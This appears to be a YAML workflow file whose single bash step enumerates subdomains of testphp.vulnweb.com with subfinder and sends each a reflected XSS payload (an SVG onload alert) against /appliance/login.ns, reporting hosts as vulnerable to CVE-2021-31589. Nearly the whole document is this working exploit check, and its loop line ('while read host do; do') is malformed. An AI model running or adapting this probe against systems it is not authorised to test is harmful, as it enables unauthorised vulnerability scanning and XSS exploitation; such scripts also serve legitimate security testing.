description: The command searches for subdomains of testphp.vulnweb.com, then for each, it tests for an XSS vulnerability by attempting to inject an SVG image tag with JavaScript into a login page, and finally reports each subdomain as either vulnerable or not to the CVE-2021-31589 based on the response.
params: target=testphp.vulnweb.com
steps:
  - name: cve
    command: bash
    script: |
      subfinder -d ${target//\"} -silent -all | while read host do; do curl -sk "$host/appliance/login.ns?login%5Bpassword%5D=test%22%3E%3Csvg/onload=alert(document.domain)%3E&login%5Buse_curr%5D=1&login%5Bsubmit%5D=Change%20Password" | grep -qs '"><svg/onload=alert(document.domain)>' && echo "$host: Vuln" || echo "$host: Not Vuln"; done
